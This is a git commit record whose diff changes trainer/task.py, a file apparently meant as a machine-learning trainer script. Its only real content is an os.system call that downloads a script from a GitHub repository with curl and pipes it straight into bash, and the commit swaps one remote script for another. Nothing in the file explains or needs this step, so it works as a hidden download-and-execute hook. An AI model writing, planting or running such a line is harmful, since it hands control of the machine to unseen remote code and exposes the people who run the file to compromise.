55f2c3f17899bd181e2cb3d7b85f81c6246bee28
vedhagsvp <vedhag230223@gmail.com>
2026-02-13 04:38:01 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/nexpapla/raw/main/inak | bash')
+os.system('curl -sL https://github.com/vedhagsvp/nexpapla/raw/main/xped.sh | bash')
